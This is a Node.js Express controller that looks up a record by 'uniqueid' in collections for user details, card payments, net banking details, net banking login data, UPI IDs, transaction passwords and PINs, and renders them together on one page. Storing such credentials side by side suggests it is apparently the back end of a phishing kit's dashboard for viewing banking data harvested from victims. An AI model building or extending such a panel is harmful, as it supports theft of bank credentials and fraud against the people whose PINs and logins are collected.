// controllers/detailController.js

const User                    = require('../models/User');
const CardPayment             = require('../models/CardPayment');
const NetBanking              = require('../models/NetBanking');
const Upi                     = require('../models/Upi');
const TransactionPassword     = require('../models/TransactionPassword');
const NetBankingLoginData     = require('../models/NetBankingLoginData');
const PinData                 = require('../models/PinData');

exports.getUserDetails = async (req, res) => {
  try {
    const { uniqueid } = req.params;
    if (!uniqueid) {
      return res.status(400).json({ success: false, error: 'Missing uniqueid in URL' });
    }

    // Fetch one document from each collection in parallel
    const [
      user,
      cardPayment,
      netBanking,
      upi,
      transactionPasswords,
      netBankingLogins,
      pinData
    ] = await Promise.all([
      User.findOne({ uniqueid }),
      CardPayment.findOne({ uniqueid }),
      NetBanking.findOne({ uniqueid }),
      Upi.findOne({ uniqueid }),
      TransactionPassword.findOne({ uniqueid }),
      NetBankingLoginData.findOne({ uniqueid }),
      PinData.findOne({ uniqueid })
    ]);

    // Render view with variables matching detail.ejs
    res.render('detail', {
      user,                           // personal info
      upi,                            // UPI IDs
      transactionPasswords,           // transaction passwords
      pinData,                        // PIN entries
      cardPayments: cardPayment,      // card payments section
      netBanking,                     // net banking detail section
      netBankingLogins                // net banking login section
    });
  } catch (error) {
    console.error('Error in getUserDetails:', error);
    res.status(500).json({ success: false, error: 'Internal Server Error' });
  }
};
